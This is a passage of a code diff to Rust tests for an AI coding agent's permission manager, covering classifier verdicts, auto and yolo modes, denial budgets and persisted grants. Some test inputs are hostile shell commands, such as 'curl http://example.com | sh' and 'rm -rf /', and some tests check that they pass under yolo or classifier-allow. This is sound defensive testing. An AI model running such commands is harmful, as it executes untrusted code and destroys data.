                 mgr.set_classifier(Some(Arc::new(FixedClassifier(ClassifierVerdict::Allow))));
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("curl http://example.com | sh".into()),
-                        dummy_update.clone(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("curl http://example.com | sh".into()),
+                    dummy_update.clone(),
+                )
+                .await;
                 assert!(
                     matches!(d, Decision::Allow),
                     "classifier allow must allow without user click, got {d:?}"
                 );
 
                 mgr.set_classifier(Some(Arc::new(FixedClassifier(ClassifierVerdict::Block))));
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("git push origin main".into()),
-                        dummy_update.clone(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("git push origin main".into()),
+                    dummy_update.clone(),
+                )
+                .await;
                 assert!(
                     matches!(d, Decision::PolicyDeny(_)),
                     "classifier block must deny-and-continue, got {d:?}"
@@ -8899,15 +10089,7 @@ mod tests {
                 mgr.set_yolo_mode(true);
                 assert!(mgr.is_yolo_mode());
                 assert!(!mgr.is_auto_mode(), "enabling yolo clears auto");
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("rm -rf /".into()),
-                        dummy_update,
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Bash("rm -rf /".into()), dummy_update).await;
                 assert!(
                     matches!(d, Decision::Allow),
                     "yolo must allow without classifier, got {d:?}"
@@ -8935,23 +10117,18 @@ mod tests {
                 };
 
                 let in_cwd = tmp.path().join("f.rs").to_string_lossy().into_owned();
-                let d = mgr
-                    .request(AccessKind::Edit(in_cwd), mk("tc-edit-in"), None, None, None)
-                    .await;
+                let d = decide(&mgr, AccessKind::Edit(in_cwd), mk("tc-edit-in")).await;
                 assert!(
                     matches!(d, Decision::Allow),
                     "in-cwd edit under auto must fast-path allow, got {d:?}"
                 );
 
-                let d = mgr
-                    .request(
-                        AccessKind::Edit("/tmp/out-of-ws.rs".into()),
-                        mk("tc-edit-out"),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Edit("/tmp/out-of-ws.rs".into()),
+                    mk("tc-edit-out"),
+                )
+                .await;
                 assert!(
                     matches!(d, Decision::Allow),
                     "out-of-workspace edit under auto must fast-path allow, got {d:?}"
@@ -8977,15 +10154,12 @@ mod tests {
                     acp::ToolCallId::new(std::sync::Arc::from("tc-cargo")),
                     Default::default(),
                 );
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("cargo test".into()),
-                        dummy_update.clone(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("cargo test".into()),
+                    dummy_update.clone(),
+                )
+                .await;
                 assert!(
                     matches!(d, Decision::Allow),
                     "heuristic auto must allow cargo test without modal, got {d:?}"
@@ -9001,15 +10175,7 @@ mod tests {
                 assert!(event.classifier_latency_ms.is_some());
                 assert_eq!(event.auto_denials_consecutive, Some(0));
                 assert_eq!(event.auto_denials_total, Some(0));
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("rm -rf /".into()),
-                        dummy_update,
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(&mgr, AccessKind::Bash("rm -rf /".into()), dummy_update).await;
                 assert!(
                     matches!(d, Decision::Reject(_)),
                     "dangerous rm -rf / must still prompt, got {d:?}"
@@ -9055,15 +10221,12 @@ mod tests {
                     Default::default(),
                 );
                 // Unknown binary would Block under heuristic alone; LLM allows.
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("my-custom-build --release".into()),
-                        dummy_update,
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("my-custom-build --release".into()),
+                    dummy_update,
+                )
+                .await;
                 assert!(
                     matches!(d, Decision::Allow),
                     "LLM allow on real gate must not prompt, got {d:?}"
@@ -9139,18 +10302,15 @@ mod tests {
                     prompt_type: ClassifierPromptType::Full,
                 })));
 
-                let decision = mgr
-                    .request(
-                        AccessKind::MCPTool {
-                            name: "test_server__do_thing".into(),
-                            input: serde_json::Value::Null,
-                        },
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let decision = decide(
+                    &mgr,
+                    AccessKind::MCPTool {
+                        name: "test_server__do_thing".into(),
+                        input: serde_json::Value::Null,
+                    },
+                    tool_call(),
+                )
+                .await;
                 assert!(matches!(decision, Decision::Reject(_)));
                 let event = events.try_recv().expect("event must be emitted");
                 assert_eq!(event.classifier_source.as_deref(), Some("transport_error"));
@@ -9186,15 +10346,12 @@ mod tests {
                     acp::ToolCallId::new(std::sync::Arc::from("tc-block")),
                     Default::default(),
                 );
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("my-custom-build --release".into()),
-                        dummy_update,
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("my-custom-build --release".into()),
+                    dummy_update,
+                )
+                .await;
                 assert!(
                     matches!(&d, Decision::PolicyDeny(r) if r.contains("exfil")),
                     "LLM block on real gate must deny-and-continue with the \
@@ -9252,15 +10409,13 @@ mod tests {
                 let request = || async {
                     tokio::time::timeout(
                         std::time::Duration::from_secs(5),
-                        mgr.request(
+                        decide(
+                            &mgr,
                             AccessKind::MCPTool {
                                 name: "test_server__do_thing".into(),
                                 input: serde_json::Value::Null,
                             },
                             tool_call(),
-                            None,
-                            None,
-                            None,
                         ),
                     )
                     .await
@@ -9323,6 +10478,155 @@ mod tests {
     }
 
     #[tokio::test]
+    async fn concurrent_session_grant_suppresses_prompt() {
+        let local = tokio::task::LocalSet::new();
+        local
+            .run_until(async {
+                let tmp = tempfile::tempdir().unwrap();
+                let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                let client = RecordingClient::default();
+                let prompts = client.prompts.clone();
+                let (mgr, mut events) =
+                    manager_with_recording_client(&cwd, None, client, ClientType::Generic);
+
+                let d = tokio::time::timeout(
+                    std::time::Duration::from_secs(5),
+                    decide(&mgr, AccessKind::Bash("ls".into()), tool_call()),
+                )
+                .await
+                .expect("warmup request must resolve, not hang");
+                assert!(matches!(d, Decision::Allow), "{d:?}");
+                let _ = events.try_recv();
+
+                let mut other = PermissionState::default();
+                other.allowed_bash_commands.insert("cargo test".to_owned());
+                persist_state(&cwd, &other, None).await;
+
+                let d = tokio::time::timeout(
+                    std::time::Duration::from_secs(5),
+                    decide(
+                        &mgr,
+                        AccessKind::Bash("cargo test --lib".into()),
+                        tool_call(),
+                    ),
+                )
+                .await
+                .expect("request must resolve, not hang");
+                assert!(matches!(d, Decision::Allow), "{d:?}");
+                assert_eq!(
+                    prompts.borrow().len(),
+                    0,
+                    "the reloaded concurrent-session grant must suppress the prompt"
+                );
+                let ev = events.try_recv().expect("event must be emitted");
+                assert_eq!(ev.decision_reason.as_deref(), Some(reasons::SESSION_GRANT));
+
+                let d = tokio::time::timeout(
+                    std::time::Duration::from_secs(5),
+                    decide(&mgr, AccessKind::Bash("./run_bench.sh".into()), tool_call()),
+                )
+                .await
+                .expect("request must resolve, not hang");
+                assert!(matches!(d, Decision::Reject(_)), "{d:?}");
+                assert_eq!(prompts.borrow().len(), 1);
+            })
+            .await;
+    }
+
+    #[tokio::test]
+    async fn human_prompt_response_resets_total_denial_budget() {
+        use crate::permission::auto_mode::{
+            ClassifierMessage, ClassifierPromptType, HeuristicPermissionClassifier,
+            LlmPermissionClassifier,
+        };
+        use std::sync::atomic::{AtomicU32, Ordering};
+
+        let local = tokio::task::LocalSet::new();
+        local
+            .run_until(async {
+                let tmp = tempfile::tempdir().unwrap();
+                let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                let client = RecordingClient::default();
+                let prompts = client.prompts.clone();
+                let (mgr, _events) =
+                    manager_with_recording_client(&cwd, None, client, ClientType::Generic);
+                mgr.set_auto_mode(true);
+                let calls = std::sync::Arc::new(AtomicU32::new(0));
+                let classify_calls = calls.clone();
+                mgr.set_classifier(Some(std::sync::Arc::new(LlmPermissionClassifier {
+                    classify_text: Some(std::sync::Arc::new(
+                        move |_messages: Vec<ClassifierMessage>| {
+                            let call = classify_calls.fetch_add(1, Ordering::Relaxed);
+                            Box::pin(async move {
+                                if call % 3 == 2 {
+                                    Ok(r#"{"shouldBlock":false,"reason":"ok"}"#.to_owned())
+                                } else {
+                                    Ok(r#"{"shouldBlock":true,"reason":"no"}"#.to_owned())
+                                }
+                            })
+                        },
+                    )),
+                    classify_channel: None,
+                    fallback: HeuristicPermissionClassifier,
+                    prompt_type: ClassifierPromptType::Full,
+                })));
+
+                let request = || async {
+                    tokio::time::timeout(
+                        std::time::Duration::from_secs(5),
+                        decide(
+                            &mgr,
+                            AccessKind::MCPTool {
+                                name: "test_server__do_thing".into(),
+                                input: serde_json::Value::Null,
+                            },
+                            tool_call(),
+                        ),
+                    )
+                    .await
+                    .expect("request must resolve, not hang")
+                };
+
+                let mut denials = 0;
+                while denials < AUTO_DENY_TOTAL_LIMIT {
+                    match request().await {
+                        Decision::PolicyDeny(_) => denials += 1,
+                        Decision::Allow => {}
+                        other => panic!("unexpected pre-budget decision {other:?}"),
+                    }
+                }
+                assert_eq!(prompts.borrow().len(), 0, "budget spent silently");
+
+                loop {
+                    match request().await {
+                        Decision::Allow => continue,
+                        Decision::Reject(_) => break,
+                        other => panic!("post-budget Block must prompt, got {other:?}"),
+                    }
+                }
+                assert_eq!(prompts.borrow().len(), 1);
+
+                let mut saw_silent_deny = false;
+                for _ in 0..3 {
+                    match request().await {
+                        Decision::PolicyDeny(_) => saw_silent_deny = true,
+                        Decision::Allow => {}
+                        other => {
+                            panic!("post-prompt request must silently deny or allow, got {other:?}")
+                        }
+                    }
+                }
+                assert!(saw_silent_deny, "at least one Block must have occurred");
+                assert_eq!(
+                    prompts.borrow().len(),
+                    1,
+                    "no prompt storm after the budget reset"
+                );
+            })
+            .await;
+    }
+
+    #[tokio::test]
     async fn requester_gone_timeout_prompt_preserves_consecutive_denials() {
         use crate::permission::auto_mode::{
             ClassifierFailure, ClassifierMessage, ClassifierPromptType,
@@ -9373,7 +10677,7 @@ mod tests {
 
                 for _ in 0..2 {
                     assert!(matches!(
-                        mgr.request(access(), tool_call(), None, None, None).await,
+                        decide(&mgr, access(), tool_call()).await,
                         Decision::PolicyDeny(_)
                     ));
                 }
@@ -9384,13 +10688,8 @@ mod tests {
                 let (respond_to, response) = oneshot::channel::<PermissionResolution>();
                 cmd_tx
                     .send(PermissionCommand::Request {
-                        access: access(),
-                        tool_call_update: tool_call(),
-                        path_context: None,
+                        request: PermissionRequest::new(access(), tool_call()),
                         respond_to,
-                        session_id: None,
-                        subagent_type: None,
-                        subagent_description: None,
                     })
                     .expect("actor alive");
                 tokio::time::timeout(std::time::Duration::from_secs(5), async {
@@ -9404,14 +10703,14 @@ mod tests {
 
                 let third_block = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(access(), tool_call(), None, None, None),
+                    decide(&mgr, access(), tool_call()),
                 )
                 .await
                 .expect("request behind abandoned prompt must resolve");
                 assert!(matches!(third_block, Decision::PolicyDeny(_)));
                 assert_eq!(prompts.borrow().len(), 1);
 
-                let escalated = mgr.request(access(), tool_call(), None, None, None).await;
+                let escalated = decide(&mgr, access(), tool_call()).await;
                 assert!(matches!(escalated, Decision::Reject(_)));
                 assert_eq!(prompts.borrow().len(), 2);
                 let mut requester_gone = None;
@@ -9430,7 +10729,6 @@ mod tests {
     #[tokio::test]
     async fn auto_classifier_block_denies_then_escalates_to_prompt() {
         use crate::permission::auto_mode::LlmPermissionClassifier;
-        use crate::permission::prompter::ENABLE_ALWAYS_APPROVE_OPTION_ID;
         let local = tokio::task::LocalSet::new();
         local
             .run_until(async {
@@ -9441,7 +10739,7 @@ mod tests {
                 // GrokPager wires the always-approve option through to its YOLO
                 // toggle; it is the option set the auto path prompts under.
                 let (mgr, _e) =
-                    manager_with_recording_client(&cwd, None, client, ClientType::GrokPager);
+                    manager_with_recording_client(&cwd, None, client, ClientType::Generic);
                 mgr.set_auto_mode(true);
                 mgr.set_classifier(Some(LlmPermissionClassifier::with_fixed_model_text(
                     r#"{"thinking":"t","shouldBlock":true,"reason":"reaches beyond the machine"}"#,
@@ -9450,15 +10748,12 @@ mod tests {
                 let request = || async {
                     tokio::time::timeout(
                         std::time::Duration::from_secs(5),
-                        mgr.request(
+                        decide(&mgr,
                             AccessKind::MCPTool {
                                 name: "test_server__do_thing".into(),
                                 input: serde_json::Value::Null,
                             },
                             tool_call(),
-                            None,
-                            None,
-                            None,
                         ),
                     )
                     .await
@@ -9484,19 +10779,11 @@ mod tests {
                     matches!(d, Decision::Reject(_)),
                     "escalated prompt is answered reject-once by the recording client, got {d:?}"
                 );
-                {
-                    let recorded = prompts.borrow();
-                    assert_eq!(
-                        recorded.len(),
-                        1,
-                        "the block past the consecutive limit must prompt exactly once"
-                    );
-                    assert_eq!(
-                        recorded[0].options.first().map(|o| o.option_id.0.as_ref()),
-                        Some(ENABLE_ALWAYS_APPROVE_OPTION_ID),
-                        "escalation picker must still offer enable-always-approve at position 0"
-                    );
-                }
+                assert_eq!(
+                    prompts.borrow().len(),
+                    1,
+                    "the block past the consecutive limit must prompt exactly once"
+                );
 
                 let d = request().await;
                 assert!(
@@ -9531,15 +10818,12 @@ mod tests {
                     ClassifierVerdict::Block,
                 ))));
                 for i in 0..(AUTO_DENY_CONSECUTIVE_LIMIT + 1) {
-                    let d = mgr
-                        .request(
-                            AccessKind::Bash("my-deploy-tool --stage".into()),
-                            tool_call(),
-                            None,
-                            None,
-                            None,
-                        )
-                        .await;
+                    let d = decide(
+                        &mgr,
+                        AccessKind::Bash("my-deploy-tool --stage".into()),
+                        tool_call(),
+                    )
+                    .await;
                     assert!(
                         matches!(d, Decision::Allow),
                         "policy allow must beat classifier deny (request #{}), got {d:?}",
@@ -9577,15 +10861,13 @@ mod tests {
 
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(
+                    decide(
+                        &mgr,
                         AccessKind::MCPTool {
                             name: "test_server__do_thing".into(),
                             input: serde_json::Value::Null,
                         },
                         tool_call(),
-                        None,
-                        None,
-                        None,
                     ),
                 )
                 .await
@@ -9627,15 +10909,13 @@ mod tests {
 
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(
+                    decide(
+                        &mgr,
                         AccessKind::MCPTool {
                             name: "test_server__other_tool".into(),
                             input: serde_json::Value::Null,
                         },
                         tool_call(),
-                        None,
-                        None,
-                        None,
                     ),
                 )
                 .await
@@ -9675,12 +10955,10 @@ mod tests {
 
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(
+                    decide(
+                        &mgr,
                         AccessKind::WebFetch("https://example.com/docs".into()),
                         tool_call(),
-                        None,
-                        None,
-                        None,
                     ),
                 )
                 .await
@@ -9721,13 +10999,7 @@ mod tests {
 
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(
-                        AccessKind::Bash(SCRIPT.into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    ),
+                    decide(&mgr, AccessKind::Bash(SCRIPT.into()), tool_call()),
                 )
                 .await
                 .expect("must resolve, not hang");
@@ -9771,7 +11043,7 @@ mod tests {
 
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(AccessKind::Bash(CMD.into()), tool_call(), None, None, None),
+                    decide(&mgr, AccessKind::Bash(CMD.into()), tool_call()),
                 )
                 .await
                 .expect("must resolve, not hang");
@@ -9811,15 +11083,12 @@ mod tests {
                 mgr.set_classifier(Some(std::sync::Arc::new(FixedClassifier(
                     ClassifierVerdict::Block,
                 ))));
-                let d = mgr
-                    .request(
-                        AccessKind::Bash("git push origin main".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d = decide(
+                    &mgr,
+                    AccessKind::Bash("git push origin main".into()),
+                    tool_call(),
+                )
+                .await;
                 assert!(
                     matches!(d, Decision::Allow),
                     "narrow policy allow must bypass the classifier, got {d:?}"
@@ -9838,15 +11107,12 @@ mod tests {
                 mgr2.set_classifier(Some(std::sync::Arc::new(FixedClassifier(
                     ClassifierVerdict::Block,
                 ))));
-                let d2 = mgr2
-                    .request(
-                        AccessKind::Bash("git push origin main".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let d2 = decide(
+                    &mgr2,
+                    AccessKind::Bash("git push origin main".into()),
+                    tool_call(),
+                )
+                .await;
                 assert!(
                     matches!(d2, Decision::PolicyDeny(_)),
                     "catch-all allow must stay suspended into the classifier, got {d2:?}"
@@ -9881,12 +11147,10 @@ mod tests {
 
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(
+                    decide(
+                        &mgr,
                         AccessKind::Bash("my-custom-build --release".into()),
                         tool_call(),
-                        None,
-                        None,
-                        None,
                     ),
                 )
                 .await
@@ -9927,13 +11191,7 @@ mod tests {
 
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(
-                        AccessKind::Bash("my-custom-build --release".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    ),
+                    decide(&mgr, AccessKind::Bash("my-custom-build --release".into()), tool_call()),
                 )
                 .await
                 .expect("must resolve, not hang");
@@ -9966,19 +11224,134 @@ mod tests {
                 persist_state(&cwd, &state, None).await;
 
                 let (mgr, _e) = test_manager(&cwd, false, None);
-                let rejected = mgr
-                    .request(
-                        AccessKind::Bash("rm -rf /tmp/zzz".into()),
-                        tool_call(),
-                        None,
-                        None,
-                        None,
-                    )
-                    .await;
+                let rejected = decide(
+                    &mgr,
+                    AccessKind::Bash("rm -rf /tmp/zzz".into()),
+                    tool_call(),
+                )
+                .await;
                 assert!(
                     matches!(&rejected, Decision::Reject(r) if r.contains("previously rejected")),
                     "disallow must Reject via session deny (not prompt failure), got {rejected:?}"
                 );
+            })
+            .await;
+    }
+
+    #[tokio::test]
+    async fn reject_always_mcp_persists_and_survives_reload() {
+        let local = tokio::task::LocalSet::new();
+        local
+            .run_until(async {
+                let tmp = tempfile::tempdir().unwrap();
+                let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+
+                let client = IdSelectingClient::new("reject-always-mcp");
+                let prompts = client.prompts.clone();
+                let (mgr, _e) = manager_with_recording_client_remember(
+                    &cwd,
+                    None,
+                    client,
+                    ClientType::GrokPager,
+                    true,
+                );
+                let access = || AccessKind::MCPTool {
+                    name: "linear__delete_issue".into(),
+                    input: serde_json::Value::Null,
+                };
+                let d = decide(&mgr, access(), tool_call()).await;
+                assert!(
+                    matches!(&d, Decision::Reject(r) if r.contains("excluded `linear__delete_issue`")),
+                    "never-allow selection must Reject with the persisted key, got {d:?}"
+                );
+                assert_eq!(prompts.borrow().len(), 1);
+
+                let persisted = crate::permission::state::load_state_from_disk(&cwd, None).await;
+                assert!(persisted.disallowed_mcp_tools.contains("linear__delete_issue"));
+                assert!(
+                    persisted.allowed_mcp_servers.is_empty()
+                        && persisted.allowed_mcp_tools.is_empty(),
+                    "reject row must never mint a grant"
+                );
+
+                let d2 = decide(&mgr, access(), tool_call()).await;
+                assert!(matches!(&d2, Decision::Reject(r) if r.contains("previously rejected")));
+                assert_eq!(prompts.borrow().len(), 1, "no second prompt");
+
+                let reload_client = RecordingClient::default();
+                let reload_prompts = reload_client.prompts.clone();
+                let (reloaded, _e2) = manager_with_recording_client(
+                    &cwd,
+                    None,
+                    reload_client,
+                    ClientType::GrokPager,
+                );
+                let d3 = decide(&reloaded, access(), tool_call()).await;
+                assert!(matches!(&d3, Decision::Reject(r) if r.contains("previously rejected")));
+                assert_eq!(reload_prompts.borrow().len(), 0);
+            })
+            .await;
+    }
+
+    #[tokio::test]
+    async fn reject_always_domain_persists_and_survives_reload() {
+        let local = tokio::task::LocalSet::new();
+        local
+            .run_until(async {
+                let tmp = tempfile::tempdir().unwrap();
+                let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+
+                let client = IdSelectingClient::new("reject-always-domain");
+                let prompts = client.prompts.clone();
+                let (mgr, _e) = manager_with_recording_client_remember(
+                    &cwd,
+                    None,
+                    client,
+                    ClientType::GrokPager,
+                    true,
+                );
+                let d = decide(
+                    &mgr,
+                    AccessKind::WebFetch("https://Example.COM/docs".into()),
+                    tool_call(),
+                )
+                .await;
+                assert!(
+                    matches!(&d, Decision::Reject(r) if r.contains("excluded `example.com`")),
+                    "never-allow selection must Reject with the deny key, got {d:?}"
+                );
+                assert_eq!(prompts.borrow().len(), 1);
+
+                let persisted = crate::permission::state::load_state_from_disk(&cwd, None).await;
+                assert!(
+                    persisted
+                        .disallowed_web_fetch_domains
+                        .contains("example.com")
+                );
+                assert!(persisted.allowed_web_fetch_domains.is_empty());
+
+                let mut with_grant = persisted;
+                with_grant
+                    .allowed_web_fetch_domains
+                    .insert("example.com".to_string());
+                persist_state(&cwd, &with_grant, None).await;
+
+                let reload_client = RecordingClient::default();
+                let reload_prompts = reload_client.prompts.clone();
+                let (reloaded, _e2) =
+                    manager_with_recording_client(&cwd, None, reload_client, ClientType::GrokPager);
+                for url in [
+                    "https://example.com/x",
+                    "https://www.example.com/x",
+                    "https://api.example.com/x",
+                ] {
+                    let d2 = decide(&reloaded, AccessKind::WebFetch(url.into()), tool_call()).await;
+                    assert!(
+                        matches!(&d2, Decision::Reject(r) if r.contains("previously rejected")),
+                        "{url}: got {d2:?}"
+                    );
+                }
+                assert_eq!(reload_prompts.borrow().len(), 0);
             })
             .await;
     }
@@ -10012,12 +11385,10 @@ mod tests {
 
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
-                    mgr.request(
+                    decide(
+                        &mgr,
                         AccessKind::Bash("my-custom-build --release".into()),
                         tool_call(),
-                        None,
-                        None,
-                        None,
                     ),
                 )
                 .await
@@ -10030,6 +11401,58 @@ mod tests {
                     prompts.borrow().len(),
                     0,
                     "disallow rejects without prompting"
+                );
+            })
+            .await;
+    }
+
+    #[tokio::test]
+    async fn auto_approve_all_bash_dangerous_still_prompts_on_classifier_block() {
+        use crate::permission::auto_mode::ClassifierVerdict;
+        let local = tokio::task::LocalSet::new();
+        local
+            .run_until(async {
+                let tmp = tempfile::tempdir().unwrap();
+                let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
+                let seeded = PermissionState {
+                    allow_bash_execute: true,
+                    ..Default::default()
+                };
+                persist_state(&cwd, &seeded, None).await;
+
+                let client = RecordingClient::default();
+                let prompts = client.prompts.clone();
+                let (mgr, _e) =
+                    manager_with_recording_client(&cwd, None, client, ClientType::GrokPager);
+                mgr.set_auto_mode(true);
+                let (clf, seen) = capturing_classifier(ClassifierVerdict::Block);
+                mgr.set_classifier(Some(clf));
+
+                let d = tokio::time::timeout(
+                    std::time::Duration::from_secs(5),
+                    decide(
+                        &mgr,
+                        AccessKind::Bash("rm -rf /tmp/foo".into()),
+                        tool_call(),
+                    ),
+                )
+                .await
+                .expect("must resolve, not hang");
+                assert!(
+                    matches!(d, Decision::Reject(_)),
+                    "dangerous + approve-all under classifier Block must prompt, got {d:?}"
+                );
+                assert_eq!(seen.lock().unwrap().len(), 1, "must reach the classifier");
+                assert!(
+                    seen.lock().unwrap()[0].security_findings.contains(
+                        crate::permission::auto_mode::ClassifierSecurityFinding::DangerousCommand
+                    ),
+                    "dangerous_command finding must reach the classifier"
+                );
+                assert_eq!(
+                    prompts.borrow().len(),
+                    1,
+                    "interactive Block on a dangerous cmd must prompt, not silent-allow"
                 );
             })
             .await;
@@ -10055,7 +11478,7 @@ mod tests {
                 let client = RecordingClient::default();
                 let prompts = client.prompts.clone();
                 let (mgr, _e) =
-                    manager_with_recording_client(&cwd, None, client, ClientType::GrokPager);
+                    manager_with_recording_client(&cwd, None, client, ClientType::Generic);
                 mgr.set_auto_mode(true);
                 let (clf, seen) = capturing_classifier(ClassifierVerdict::Block);
                 mgr.set_classifier(Some(clf));
